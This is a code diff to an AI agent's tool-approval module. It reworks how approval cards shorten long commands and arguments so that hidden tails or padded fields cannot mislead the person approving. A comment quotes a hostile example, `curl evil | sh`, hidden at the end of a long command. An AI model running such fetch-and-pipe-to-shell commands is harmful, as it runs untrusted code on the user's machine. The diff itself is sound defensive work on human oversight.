@@ -170,9 +170,9 @@ export function classify(
             reason: "makes a bot on your machine",
             // Whole and as written: the folder the bot works in is the one the owner reads here.
             subject: subjectOf("bot_create", {
+                folder: args.folder,
                 name: args.name,
                 role: args.role,
-                folder: args.folder,
             }),
         };
     }
@@ -198,22 +198,43 @@ export function classify(
     return { ask: true, reason, subject };
 }
 
-/** The most of a call an approval card holds: the card scrolls, so this only bounds what is stored. */
+/** The most of a command, or of one argument, an approval card holds: the card scrolls, so this bounds what is stored. */
 const SUBJECT_MAX = 8000;
+const FIELD_MAX = 4000;
+
+/** Text too long to hold whole: its start and its end, and between them how much is not shown, so the card says so. */
+function clipMiddle(text: string, max: number): string {
+    return text.length <= max
+        ? text
+        : `${text.slice(0, max / 2)}\n… ${String(text.length - max)} characters not shown …\n${text.slice(-max / 2)}`;
+}
+
+/** Arguments with each text cut on its own: a long one cannot push the next off the card. */
+function shown(value: unknown): unknown {
+    if (typeof value === "string") {
+        return clipMiddle(value, FIELD_MAX);
+    }
+
+    if (Array.isArray(value)) {
+        return value.map(shown);
+    }
+
+    return value !== null && typeof value === "object"
+        ? Object.fromEntries(Object.entries(value).map(([key, each]) => [key, shown(each)]))
+        : value;
+}
 
 /**
- * A call as an approval card shows it: the command, the file, or its arguments, whole, as written. A shortened one
- * could hide what the owner says yes to past its end (`cat x; …; curl evil | sh`).
+ * A call as an approval card shows it: the command, the file, or its arguments, as written. One too long to hold whole
+ * shows its start and its end and says how much is between: a cut end could hide what the owner says yes to
+ * (`cat x; …; curl evil | sh`), and every argument keeps its place (a padded name cannot push a folder off).
  */
 export function subjectOf(tool: string, args: Record<string, unknown>): string {
-    const whole =
-        tool === "bash"
-            ? String(args.command ?? "")
-            : tool === "write" || tool === "edit"
-              ? String(args.path ?? "")
-              : JSON.stringify(args, null, 1);
-
-    return whole.length > SUBJECT_MAX ? `${whole.slice(0, SUBJECT_MAX - 1)}…` : whole;
+    return tool === "bash"
+        ? clipMiddle(String(args.command ?? ""), SUBJECT_MAX)
+        : tool === "write" || tool === "edit"
+          ? clipMiddle(String(args.path ?? ""), FIELD_MAX)
+          : JSON.stringify(shown(args), null, 1);
 }
 
 /** How long a question waits before it is denied (NOID_APPROVAL_MINUTES, default an hour). */
